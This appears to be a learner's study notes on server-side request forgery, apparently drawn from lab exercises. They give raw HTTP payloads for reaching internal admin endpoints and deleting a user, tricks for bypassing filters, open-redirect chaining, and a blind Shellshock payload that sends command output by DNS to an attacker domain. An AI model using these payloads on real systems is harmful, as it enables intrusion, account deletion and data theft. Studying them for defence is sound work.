# SSRF

forcing an application to make a request, to either internal or external endpoints.

## impacts

exploit trust relationship
performing unauthorized actions
communicating to other back-end systems
command execution

### attack the server

trust relationships, where requests originating from the local machine are handled
differently than ordinary requests, often make SSRF into a critical vulnerability.

the attack happens with an http request to the server, via loopback network interface
(`localhost`).

normal behaviour:

```http
POST /product/stock HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 118

stockApi=http://stock.weliketoshop.net:8080/product/stock/check%3FproductId%3D6%26storeId%3D1
```

exploit:

```http
POST /product/stock HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 118

stockApi=http://localhost/admin
```

because the request is within the application, the attacker doesn't need to have access to
the file.

to access functionalities:

```http
...
stockApi=http%3a//localhost/admin/delete?username=carlos
...
```

### attack other back-end systems

application interacts with other systems that are not accessible from the outside, but don't
require authentication for internal users.

exploit:

```http
...
stockApi=http://192.168.0.68/admin
...
```

in these cases we are looking for 200, and of course 404 is interesting `../63/README.md`

## bypassing


### blacklist-based input filter

inputs containing `localhost`, `127.0.0.1`, `admin` and the like are blocked.

solutions:

* *alternative IP* representation: `2130706433`, `017700000001` or `127.1`.
* implement a *custom DNS* that maps to `127.0.0.1`, passing the domain to the server might
  bypass the filter.
* Obfuscate blocked strings using *URL encoding* or *case variation*.
* Provide a URL that you control, which redirects to the target URL. so if just the
  initial URL is checked not the one after *redirection*. try different redirect code and
  http protocol.

I had two errors for this:
```http
stockApi=http://localhost/admin
```

1. `"External stock check blocked for security reasons"`, so change `admin` to `aDmIn`.
2. `2130706433` resulted in `"host unknown"`, so changed `localhost` to `127.1`.

```http
stockApi=http://127.1/aDmIn/delete?username=carlos
```

### whitelist-based input filter

The filter may look for a match at the beginning of the input, or somewhere within in it.

solutions: URL has some features that could be exploited. consider the host as:
* a username: `https://expected-host:fakepassword@evil-host`
* a URL fragment: `https://evil-host#expected-host`
* a subdomain: `https://expected-host.evil-host`, so in fact it will be requesting evil.
* also try *URL encoding* specially if the filter handles URL-encoding differently than the
  requesting code. Also *double encoding*.

if none of these worked, check other stuff:

* try to see if the parser accepts credentials for the expected host:
  `stockApi=http://localhost:pass@stock.weliketoshop.net:8080/`
* if `#` is accepted (double encoded):
  `stockApi=http://localhost%2523@stock.weliketoshop.net:8080/`
  `:pass` --> `400; "Invalid external stock check url 'Invalid URL'"`
  `:80` --> `200`
* and the next step:
  `http://localhost:80%2523@stock.weliketoshop.net/admin/delete?username=carlos`

  `#` works in the URL: it is supposed to refer to an element in the page.

exploiting:

* `stockApi=http://stock.weliketoshop.net.localhost:8080/admin` --> `"External stock check
  host must be stock.weliketoshop.net"`
* `internal server` or `bad request` or `missing parameter` messages indicate that we have
  somewhat successfully bypassed the filter.

### bypass using open redirection vulnerability

if validation is strict but the API supports redirection, you could try to bypass it by
constructing a URL that passes validation, then redirects to the target.

first you need to find a redirection vulnerability.

vulnerable code:

```http
...
stockApi=%2Fproduct%2Fstock%2Fcheck%3FproductId%3D1%26storeId%3D1
```

this isn't vulnerable to usual stuff but on trying `nextproduct` button, a request is sent
that contains a path parameter:
`GET /product/nextProduct?currentProductId=1&path=/product?productId=2 HTTP/2`
and is vulnerable to open redirection:
`GET /product/nextProduct?currentProductId=1&path=http://192.168.0.12:8080` --> `302`

and then you should implement the previous ideas using this URL:

```http
...
stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos
```

## Blind SSRF

you can force the app to make a request but the response from the back-end request isn't
returned to the application's front-end response.

### how to find it

Using out of band (OAST) techniques.

a `referrer` header could be vulnerable because there is a software in the back-end that
fetches the URL. if we change it to our controlled domain, we might see some http and DNS
interactions.

### how to exploit it

because we can not see the response from back-end request, we can't use it to exploit the
systems that the application can reach. but could be used on the server itself or other
back-end systems. you can scan the whole internal IP and send payloads for known
vulnerabilities.

the `User-Agent` header could also be vulnerable, we can see it reflects our user agent.

so it is vulnerable to shellshock: the User-Agent header is vulnerable, in the case we use
`/bin/nslookup $(whoami).<ourDomain>`. then we change the referrer to the internal IP:port,
so that it is trusted (brute force might be required to find a valid endpoint).

Why Does Burp Collaborator See the Request?

  Burp Collaborator owns the DNS zone for BURP-COLLABORATOR-SUBDOMAIN. Any queries for that
  subdomain ultimately reach Burp Collaborator's servers, regardless of which intermediate
  resolvers are used.

# Finding hidden attack surface for SSRF

* partial URLs in requests: an application places only a hostname or part of a URL path into
  request parameters.
* URLs are in data format: like XML
* referrer header: e.g. used by analytic software
